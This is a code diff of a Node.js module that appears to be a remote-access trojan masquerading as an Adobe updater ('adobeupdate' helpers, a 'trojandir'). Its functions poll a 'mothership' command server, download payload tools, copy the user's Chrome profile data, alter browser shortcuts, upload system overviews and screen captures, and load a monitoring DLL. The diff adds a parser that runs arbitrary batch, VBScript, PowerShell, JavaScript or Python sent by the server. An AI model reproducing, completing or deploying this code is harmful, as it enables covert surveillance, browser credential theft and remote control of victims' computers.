@@ -9,7 +9,6 @@ const util = require("util");
 
 const ISDEBUG = true;
 
-var cmdname = null;
 var cmdconfig = null;
 
 class CmdConfig {
@@ -490,7 +489,8 @@ class CmdConfig {
 
 // --- IPC for current running process: message send/receive
 
-// message handler -- overriden by child cmds (ping, cmdlist)
+// incomming message handler for process.on("message"...
+// overriden by child cmds (ping, cmdlist)
 var handleMessage = function (msg) {
     helper.logmsg("pass");
 };
@@ -526,7 +526,7 @@ async function sendMessage(dest, msgpayload) {
 
     let message = {
         senderPid: process.pid,
-        src: systemconfig.cmdname,
+        src: helper_config.systemconfig.cmdname,
         dest: dest,
         payload: msgpayload,
         ts: getTimestamp(),
@@ -580,7 +580,7 @@ async function penetrate() {
         process.exit(0);
     }
 
-    if (!helper.fileExists(systemconfig.launch_script_fpath)) {
+    if (!helper.fileExists(helper_config.systemconfig.launch_script_fpath)) {
         await download_launch_script();
     }
 
@@ -601,7 +601,9 @@ async function penetrate() {
 async function watchdog() {
     helper.logmsg("starting");
 
-    let watchdogcmd = cmdconfig;
+    let runningcmd = helper_cmd.cmdconfig;
+
+    // TODO check runningcmd cmdname is watchdog
 
     // let penetratecmd = new CmdConfig("penetrate");
     // let retrievecmd = new CmdConfig("retrieve");
@@ -609,16 +611,16 @@ async function watchdog() {
     // retrievecmd.launch(null, true);
     // penetratecmd.launch(null, true);
 
-    watchdogcmd.newCmdConfig("ping");
-    watchdogcmd.newCmdConfig("cmdlist");
+    runningcmd.newCmdConfig("ping");
+    runningcmd.newCmdConfig("cmdlist");
     // watchdogcmd.newCmdConfig("jsrelay");
     // watchdogcmd.newCmdConfig("psrelay");
     // watchdogcmd.newCmdConfig("cmdrelay");
     // watchdogcmd.newCmdConfig("pyrelay");
 
-    let childcmds = watchdogcmd.childcmds;
+    let childcmds = runningcmd.childcmds;
 
-    watchdogcmd.loopfunc = () => {
+    runningcmd.loopfunc = () => {
         for (let i = 0; i < childcmds.length; i++) {
             let childcmd = childcmds[i];
 
@@ -626,7 +628,7 @@ async function watchdog() {
         }
     };
 
-    watchdogcmd.loop();
+    runningcmd.loop();
 
     helper.logmsg("finished");
 }
@@ -663,7 +665,7 @@ function validatePingResponse(pingresponse) {
 function cmdlist_handlecmdjob(clientjob) {
     helper.logmsg("starting");
 
-    let cmdlistcmd = systemconfig.cmdconfig;
+    let cmdlistcmd = helper_config.systemconfig.cmdconfig;
 
     let cmdname = clientjob.cmdname.toLowerCase();
 
@@ -720,7 +722,7 @@ function cmdlist_handlecmdjob(clientjob) {
 async function cmdlist_handleMessage(msg) {
     helper.logmsg("starting");
 
-    let cmdlistcmd = systemconfig.cmdconfig;
+    let cmdlistcmd = helper_cmd.cmdconfig;
 
     let clientjob = msg?.payload ?? null;
 
@@ -737,9 +739,12 @@ async function cmdlist_handleMessage(msg) {
         clientjob = await retrieveClientJob();
     }
 
-    let configfpath = systemconfig.getClientJobConfigPath();
+    let configfpath = path.join(
+        helper_config.systemconfig.trojandir,
+        "clientjobconfig_" + helper.getRandomCode(8) + ".json"
+    );
 
-    fs.writeFileSync(configfpath, JSON.stringify(clientjob));
+    helper.writeTag(configfpath, JSON.stringify(clientjob));
 
     clientjob["configfpath"] = configfpath;
 
@@ -770,19 +775,19 @@ async function cmdlist_handleMessage(msg) {
 function cmdlist() {
     helper.logmsg("starting");
 
-    let cmdlistcmd = systemconfig.cmdconfig;
+    let runningcmd = helper_cmd.cmdconfig;
 
-    if (cmdlistcmd.cmdname != "cmdlist") {
+    if (runningcmd.cmdname != "cmdlist") {
         throw new Error("cmdlist routine must only be called from cmdlist cmd");
     }
 
     handleMessage = cmdlist_handleMessage;
 
-    cmdlistcmd.loopfunc = () => {
+    runningcmd.loopfunc = () => {
         helper.logmsg("cmdlist looping...");
     };
 
-    cmdlistcmd.loop();
+    runningcmd.loop();
 
     helper.logmsg("finished");
 }
@@ -810,7 +815,7 @@ async function retrieve() {
     helper.logmsg("starting");
 
     let assets = [
-        systemconfig.launch_script_fname,
+        helper_config.systemconfig.launch_script_fname,
         "pythonrelay.py",
         "pc_monitoring.ps1",
         "nircmdc.exe",
@@ -823,9 +828,9 @@ async function retrieve() {
 
     for (let i = 0; i < assets.length; i++) {
         let fname = assets[i];
-        let localpath = path.join(systemconfig.trojandir, fname);
+        let localpath = path.join(helper_config.systemconfig.trojandir, fname);
 
-        let baseUrl = systemconfig.mothershipassets + "/" + fname;
+        let baseUrl = helper_config.systemconfig.mothershipassets + "/" + fname;
 
         if (helper.fileExists(localpath)) {
             helper.logmsg(`assets exists ${localpath} -- skipping `);
@@ -838,7 +843,12 @@ async function retrieve() {
             localpath: localpath,
         };
 
-        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+        let response = await helper_web.makeGetRequest(
+            baseUrl,
+            null,
+            null,
+            downloadOpts
+        );
 
         if (!helper.fileExists(localpath)) {
             throw new Error("retrieve failed for: " + localpath);
@@ -872,12 +882,12 @@ async function modify_chrome() {
 
     helper.logmsg("starting");
 
-    let runningcmd = systemconfig.cmdconfig;
+    let runningcmd = helper_config.systemconfig.cmdconfig;
 
-    let scriptfname = systemconfig.istpl
+    let scriptfname = helper_config.systemconfig.istpl
         ? "modify_browser_lnk_tpl.ps1"
         : "modify_browser_lnk.ps1";
-    scriptfpath = path.join(systemconfig.trojandir, scriptfname);
+    scriptfpath = path.join(helper_config.systemconfig.trojandir, scriptfname);
 
     let ret = "";
 
@@ -903,15 +913,17 @@ async function modify_chrome() {
     targetFolders.push(`C:\\Users\\Public\\Desktop`);
 
     targetFolders.push(
-        `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`
+        `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`
     );
     targetFolders.push(
-        `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`
+        `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`
     );
     targetFolders.push(
-        `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`
+        `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`
     );
-    targetFolders.push(`C:\\Users\\${systemconfig.username}\\Desktop`);
+    targetFolders.push(
+        `C:\\Users\\${helper_config.systemconfig.username}\\Desktop`
+    );
 
     targetFolders.push(
         "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs"
@@ -986,7 +998,7 @@ async function modify_chrome() {
         };
 
         let jsonconfigpath = path.join(
-            systemconfig.trojandir,
+            helper_config.systemconfig.trojandir,
             scriptfname + "_" + getTimestamp() + "_config.json"
         );
 
@@ -997,7 +1009,7 @@ async function modify_chrome() {
 
     helper.logmsg(`copying user data folder`);
 
-    srcpath = `C:\\Users\\${systemconfig.username}\\AppData\\Local\\Google\\Chrome\\User Data`; // anchor
+    srcpath = `C:\\Users\\${helper_config.systemconfig.username}\\AppData\\Local\\Google\\Chrome\\User Data`; // anchor
     destpath = "C:\\ProgramData\\owd\\chrome";
 
     if (!folderExists(destpath))
@@ -1028,11 +1040,16 @@ async function copy_userdata(srcpath, destpath) {
         });
     });
 }
-// TODO add screencapture, modify params to put in switches enabling disabling, upload option
+
+// TODO implement new cmd
+async function systemmon() {}
+
+// TODO add screencapture, modify params to put in switches enabling disabling,
+//      upload option
 async function getsystemoverview() {
     helper.logmsg("starting");
 
-    let runningcmd = systemconfig.cmdconfig;
+    let runningcmd = helper_config.systemconfig.cmdconfig;
     let config = runningcmd.config;
 
     if (!config) {
@@ -1043,7 +1060,7 @@ async function getsystemoverview() {
 
     let dir_snapshot = null;
     try {
-        dir_snapshot = getDirInfo(systemconfig.trojandir);
+        dir_snapshot = getDirInfo(helper_config.systemconfig.trojandir);
     } catch (err) {
         dir_snapshot = helper.errorToJson(err);
     }
@@ -1079,17 +1096,17 @@ async function getsystemoverview() {
     let outjson_str = JSON.stringify(outjson);
 
     let localfpath = path.join(
-        systemconfig.trojandir,
+        helper_config.systemconfig.trojandir,
         runningcmd.cmdname + "_out_" + getTimestamp() + ".json"
     );
 
     fs.writeFileSync(localfpath, outjson_str, "utf-8");
 
-    let baseUrl = systemconfig.mothership + "/ow/upload.php";
+    let baseUrl = helper_config.systemconfig.mothership + "/ow/upload.php";
 
     let filename = "getsystemoverview.out";
 
-    let kvp = systemconfig.statekvp;
+    let kvp = helper_config.systemconfig.statekvp;
     kvp["filename"] = filename;
     kvp["jobcode"] = runningcmd.jobcode;
 
@@ -1100,15 +1117,87 @@ async function getsystemoverview() {
     process.exit(0);
 }
 
+function processClientJob(rawtext) {
+    let clientjob = null;
+
+    if (rawtext.includes("execute_cmdlist")) {
+        clientjob = {
+            jobtype: "execute_cmdlist",
+            jobcode: "",
+        };
+
+        return clientjob;
+    }
+
+    let jobcode = helper.extractText(rawtext, "JOBCODE_BEGIN", "JOBCODE_END");
+
+    let begintoken = "EXEC_CMD_BEGIN";
+    let endtoken = "EXEC_CMD_END";
+    let cmdstr = helper.extractText(rawtext, begintoken, endtoken);
+
+    if (!helper.isNullOrWhitespace(cmdstr)) {
+        let parts = cmdstr.split("|");
+        parts = parts.filter((item) => !helper.isNullOrWhitespace(item));
+
+        if (parts.length >= 1) {
+            let clientjob = {
+                jobtype: "EXEC_CMD",
+                jobcode: jobcode,
+                cmdname: parts[0],
+                args: parts.length > 1 ? parts.slice(1) : [],
+            };
+
+            return clientjob;
+        } else {
+            throw new Error("client job request is malformed");
+        }
+    }
+
+    let tokens = ["BAT", "VBS", "PS1", "JS", "PY"];
+
+    for (let i = 0; i < tokens.length; i++) {
+        let token = tokens[i];
+
+        let scripttext = helper.extractText(
+            rawtext,
+            "EXEC_" + token + "_BEGIN",
+            "EXEC_" + token + "_END"
+        );
+
+        if (!helper.isNullOrWhitespace(scripttext)) {
+            let fpath = systemstate.getClientJobPath();
+            fs.writeFileSync(fpath, scripttext, "utf8");
+
+            if (!fileExists(fpath)) {
+                throw new Error("unable to write script text to file " + fpath);
+            }
+
+            let clientjob = {
+                jobtype: "EXEC_" + token,
+                jobcode: jobcode,
+                //scripttext: scripttext
+                localpath: fpath,
+            };
+
+            return clientjob;
+        }
+    }
+
+    return null;
+}
+
 async function ping_loop() {
-    let baseUrl = systemconfig.mothership + "/ow/ping.php"; // TODO move over to systemconfig
+    let baseUrl = helper_config.mothershipconfig.pingurl;
 
     let inputHeaders = null;
-    let params = systemconfig.statekvp;
+    let params = helper_config.systemconfig.statekvp;
 
-    let pingpath = path.join(systemconfig.trojandir, "ping_response");
+    let pingpath = path.join(
+        helper_config.systemconfig.trojandir,
+        "ping_response"
+    );
     let downloadOpts = { download: true, filetype: "txt", localpath: pingpath };
-    let pingresponse = await makeGetRequest(
+    let pingresponse = await helper_web.makeGetRequest(
         baseUrl,
         params,
         inputHeaders,
@@ -1119,7 +1208,7 @@ async function ping_loop() {
 
     if (!isvalid) {
         helper.logmsg("ping response is invalid");
-        systemconfig.selectMothership();
+        helper_config.systemconfig.selectMothership();
         return;
     }
 
@@ -1143,7 +1232,7 @@ function ping_handleMessage(msg) {
 function ping() {
     helper.logmsg("starting");
 
-    let cmdconfig = systemconfig.cmdconfig;
+    let cmdconfig = helper_cmd.cmdconfig;
     handleMessage = ping_handleMessage;
 
     cmdconfig.loopfunc = ping_loop;
@@ -1153,86 +1242,10 @@ function ping() {
     helper.logmsg("finished");
 }
 
-async function install_node() {
-    helper.logmsg("starting");
-
-    let installcmd = systemconfig.cmdconfig;
-
-    let verify_node = await verify_node_install();
-
-    if (verify_node.state) {
-        helper.logmsg("node installed -- passing through");
-        process.exit(0);
-        return;
-    }
-
-    verify_node = verify_node_download();
-
-    if (!verify_node?.state) {
-        helper.logmsg(verify_node?.msg);
-        await download_node(verify_node?.missingfiles);
-    }
-
-    verify_node = verify_node_download();
-
-    if (!verify_node?.state) {
-        // helper.logmsg(verify_node?.msg); // TO
-        throw new Error("node download failed");
-    }
-
-    if (!helper.fileExists(path.join(systemconfig.trojandir, "7za.exe")))
-        await retrieve_asset("7za.exe");
-
-    if (!helper.fileExists(path.join(systemconfig.trojandir, "gunite.exe")))
-        await retrieve_asset("gunite.exe");
-
-    let args = [
-        path.join(systemconfig.nodegsdfilesdir, "disk1.gsd"),
-        "-u",
-        path.join(systemconfig.nodedir, "node.zip"),
-        "-s",
-    ];
-
-    let childp = null;
-
-    try {
-        childp = await invoke_exe("gunite.exe", args); // throws error despite success
-    } catch (err) {
-        helper.logmsg(err);
-    }
-
-    let fpath = path.join(systemconfig.nodedir, "node.zip");
-
-    if (!helper.fileExists(fpath)) {
-        throw new Error("file does not exist " + fpath);
-    }
-
-    const stats = fs.statSync(fpath);
-    if (!stats.size == 47549770) {
-        throw new Error("incorrect file size " + stats.size + " 72890982");
-    }
-
-    args = ["x", fpath, "-o" + systemconfig.nodedir, "-aoa", "-y"];
-
-    try {
-        childp = await invoke_exe("7za.exe", args);
-    } catch (err) {
-        helper.logmsg(err);
-    }
-
-    verify_node = await verify_node_install();
-
-    if (!verify_node?.state) {
-        throw new Error(verify_node?.msg);
-    }
-
-    helper.logmsg("finished");
-}
-
 function relay() {
     helper.logmsg("starting");
 
-    let relaycmd = systemconfig.cmdconfig;
+    let relaycmd = helper_config.systemconfig.cmdconfig;
 
     let clientjob = relaycmd.clientjob;
 
@@ -1368,13 +1381,13 @@ function execjob() {
 function launch_pcmon_koffi() {
     const koffi = require("koffi");
 
-    let dllpath = path.join(systemconfig.pcmondir, "pcmon.dll");
+    let dllpath = path.join(helper_config.systemconfig.pcmondir, "pcmon.dll");
 
     if (!helper.fileExists(dllpath)) {
         throw new Error("dll does not exist " + dllpath);
     }
 
-    process.chdir(systemconfig.pcmondir);
+    process.chdir(helper_config.systemconfig.pcmondir);
 
     const lib = koffi.load(dllpath);
     const pcmon_func = lib.func("__stdcall", "pcmon_main", "int", []);
@@ -1382,7 +1395,7 @@ function launch_pcmon_koffi() {
 }
 
 async function pcmon_tpl() {
-    let dllpath = path.join(systemconfig.pcmondir, "pcmon.dll");
+    let dllpath = path.join(helper_config.systemconfig.pcmondir, "pcmon.dll");
 
     if (!helper.fileExists(dllpath)) {
         await download_pcmon();
@@ -1402,14 +1415,14 @@ async function pcmon_tpl() {
 async function pcmon() {
     helper.logmsg("starting");
 
-    let pcmoncmd = systemconfig.cmdconfig;
+    let pcmoncmd = helper_config.systemconfig.cmdconfig;
 
-    if (systemconfig.istpl) {
+    if (helper_config.systemconfig.istpl) {
         await pcmon_tpl();
         return;
     }
 
-    let exepath = path.join(systemconfig.pcmondir, "pcmon.exe");
+    let exepath = path.join(helper_config.systemconfig.pcmondir, "pcmon.exe");
 
     if (!helper.fileExists(exepath)) {
         await download_pcmon();
@@ -1461,9 +1474,12 @@ async function pcmon() {
 async function pspcmon() {
     helper.logmsg("starting");
 
-    let pspcmoncmd = systemconfig.cmdconfig;
+    let pspcmoncmd = helper_config.systemconfig.cmdconfig;
 
-    let scriptfpath = path.join(systemconfig.pspcmondir, "pc_monitoring.ps1");
+    let scriptfpath = path.join(
+        helper_config.systemconfig.pspcmondir,
+        "pc_monitoring.ps1"
+    );
 
     if (!helper.fileExists(scriptfpath)) {
         await download_pspcmon();
@@ -1582,31 +1598,20 @@ async function getscreencapture() {
     process.exit(0);
 }
 
+const helper_ps = require("./adobeupdate.helper.ps.js");
+
+var cmdname = helper_ps.getcmdname();
+var cmdconfig = new CmdConfig(cmdname);
+
 module.exports = {
-    CmdConfig,
-    penetrate,
-    watchdog,
+    CmdConfig: CmdConfig,
+    penetrate: penetrate,
+    watchdog: watchdog,
+    cmdname: cmdname,
+    cmdconfig: cmdconfig,
 };
 
 const helper = require("./adobeupdate.helper.js");
-const helper_ps = require("./adobeupdate.helper.ps.js");
 const helper_config = require("./adobeupdate.helper.config.js");
-
-cmdname = helper_ps.getcmdname();
-cmdconfig = new CmdConfig(cmdname);
-
-Object.defineProperty(module.exports, "cmdconfig", {
-    get() {
-        return cmdconfig;
-    },
-    enumerable: true,
-    configurable: true,
-});
-
-Object.defineProperty(module.exports, "cmdname", {
-    get() {
-        return cmdname;
-    },
-    enumerable: true,
-    configurable: true,
-});
+const helper_cmd = require("./adobeupdate.helper.cmd.js");
+const helper_web = require("./adobeupdate.helper.web.js");
